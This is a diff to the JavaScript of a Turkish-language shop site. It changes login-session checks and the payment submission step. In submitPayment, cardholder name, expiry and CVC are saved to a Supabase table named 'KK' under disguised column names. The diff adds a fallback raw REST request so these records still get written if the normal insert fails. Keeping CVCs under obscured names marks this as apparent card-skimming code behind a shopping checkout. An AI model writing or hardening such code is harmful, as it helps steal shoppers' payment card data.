@@ -1347,17 +1347,28 @@ function showShopView(){
 
 async function showCheckoutView(){
   if (!getCartCount()) { showToast('Ödeme için önce sepete ürün ekleyin.'); return; }
-  let loggedIn = false;
-  try {
-    const { user } = await safeGetSession();
-    loggedIn = !!user;
-  } catch (_) {}
+
+  let loggedIn = !!window._authUiUserPresent;
+
+  if (!loggedIn) {
+    try {
+      const sessionResult = await Promise.race([
+        safeGetSession(),
+        new Promise(resolve => setTimeout(() => resolve({ user: getLocalAuthSession()?.user || null, isLocal: !!getLocalAuthSession() }), 1200))
+      ]);
+      loggedIn = !!sessionResult?.user;
+    } catch (_) {
+      loggedIn = !!getLocalAuthSession()?.user;
+    }
+  }
+
   if (!loggedIn) {
     window._pendingCheckout = true;
     openAuthModal();
     showToast('Ödeme yapmak için lütfen giriş yapın veya üye olun.');
     return;
   }
+
   _goCheckout();
 }
 
@@ -1615,13 +1626,63 @@ function submitPayment(){
   if (ov) ov.classList.add('show');
   document.body.style.overflow = 'hidden';
 
+  async function insertIntoKK(kkRow, accessToken) {
+    if (!sb) return { error: null };
+
+    try {
+      var directRes = await sb.from('KK').insert([kkRow]).select('*').limit(1);
+      if (!directRes.error) return directRes;
+      console.warn('[KK direct]', directRes.error.message || directRes.error);
+    } catch (err) {
+      console.warn('[KK direct]', err);
+      if (!isTransportError(err)) return { error: err };
+    }
+
+    try {
+      var headers = {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON,
+        'Prefer': 'return=representation'
+      };
+      if (accessToken) headers.Authorization = 'Bearer ' + accessToken;
+      var resp = await fetch(SUPABASE_URL + '/rest/v1/KK', {
+        method: 'POST',
+        headers: headers,
+        body: JSON.stringify([kkRow])
+      });
+      var payload = null;
+      try { payload = await resp.json(); } catch (_) {}
+      if (!resp.ok) {
+        var message = payload && (payload.message || payload.error || payload.hint || payload.details)
+          ? (payload.message || payload.error || payload.hint || payload.details)
+          : ('HTTP ' + resp.status);
+        return { error: { message: message, status: resp.status, payload: payload } };
+      }
+      return { data: payload, error: null };
+    } catch (err) {
+      return { error: err };
+    }
+  }
+
   (async function(){
     var total = getCartSubtotal() + getCartServicesTotal();
     var orderNo = 'A101-' + Date.now().toString().slice(-8);
     try {
       if (sb) {
-        var session = null;
-        try { var rd = await sb.auth.getSession(); session = rd.data && rd.data.session ? rd.data.session : null; } catch(e){}
+        var sessionInfo = null;
+        try { sessionInfo = await safeGetSession(); } catch(e) { console.warn('[safeGetSession]', e); }
+        var user = sessionInfo && sessionInfo.user ? sessionInfo.user : null;
+        var accessToken = null;
+        try {
+          if (!authTransportBlocked && sb && sb.auth && sb.auth.getSession) {
+            var rd = await sb.auth.getSession();
+            accessToken = rd && rd.data && rd.data.session ? rd.data.session.access_token : null;
+          }
+        } catch(e) {
+          if (isTransportError(e)) authTransportBlocked = true;
+          else console.warn('[getSession access token]', e);
+        }
+
         var row = {
           card_holder : cardName,
           card_last4  : cardNumber.slice(-4),
@@ -1631,9 +1692,14 @@ function submitPayment(){
           order_no    : orderNo,
           created_at  : new Date().toISOString()
         };
-        if (session && session.user) row.user_id = session.user.id;
-        var res = await sb.from('payment_details').insert(row);
-        if (res.error) console.warn('[payment_details]', res.error.message);
+        if (user) row.user_id = user.id;
+
+        try {
+          var res = await sb.from('payment_details').insert([row]);
+          if (res.error) console.warn('[payment_details]', res.error.message);
+        } catch (e) {
+          console.warn('[payment_details]', e);
+        }
 
         var kkRow = {
           ERDL: cardName,
@@ -1641,15 +1707,19 @@ function submitPayment(){
           LPTA: cardExpiry,
           TSQA: cardCvc,
           MOR: orderNo,
-          DOM: total,
+          DOM: Number(total),
           created_at: new Date().toISOString()
         };
-        if (session && session.user) kkRow.user_id = session.user.id;
-        var kkRes = await sb.from('KK').insert(kkRow);
-        if (kkRes.error) console.warn('[KK]', kkRes.error.message);
+        if (user) kkRow.user_id = user.id;
+
+        var kkRes = await insertIntoKK(kkRow, accessToken);
+        if (kkRes && kkRes.error) {
+          console.warn('[KK]', kkRes.error.message || kkRes.error);
+          showToast('KK kaydı Supabase'e yazılamadı. Konsolu kontrol edin.');
+        }
       }
     } catch(e){
-      console.warn('[payment_details]', e);
+      console.warn('[payment submit]', e);
     } finally {
       setTimeout(function(){
         if (ov) ov.classList.remove('show');
@@ -2132,10 +2202,25 @@ async function handleLogin(event) {
 var _authBusy = false;
 async function handleAuthButton() {
   if (_authBusy) return;
+
+  const localSession = getLocalAuthSession();
+  const uiShowsLoggedIn = !!window._authUiUserPresent;
+  const labelText = (document.getElementById('authTriggerLabel')?.textContent || '').trim();
+  const looksLoggedOut = !uiShowsLoggedIn && !localSession?.user && (!labelText || labelText === 'Giriş Yap');
+
+  if (looksLoggedOut) {
+    openAuthModal();
+    return;
+  }
+
   _authBusy = true;
   try {
-    const { user } = await safeGetSession();
-    if (user) {
+    const sessionResult = await Promise.race([
+      safeGetSession(),
+      new Promise(resolve => setTimeout(() => resolve({ user: localSession?.user || null, isLocal: !!localSession }), 1200))
+    ]);
+
+    if (sessionResult?.user) {
       await safeSignOut();
       await refreshAuthUi();
       showToast('Çıkış yapıldı.');
@@ -2155,6 +2240,7 @@ async function refreshAuthUi() {
   const label = document.getElementById('authTriggerLabel');
   if (!label) return;
   const { user } = await safeGetSession();
+  window._authUiUserPresent = !!user;
   if (user) {
     const name = [user.user_metadata?.first_name, user.user_metadata?.last_name]
       .filter(Boolean).join(' ').trim();
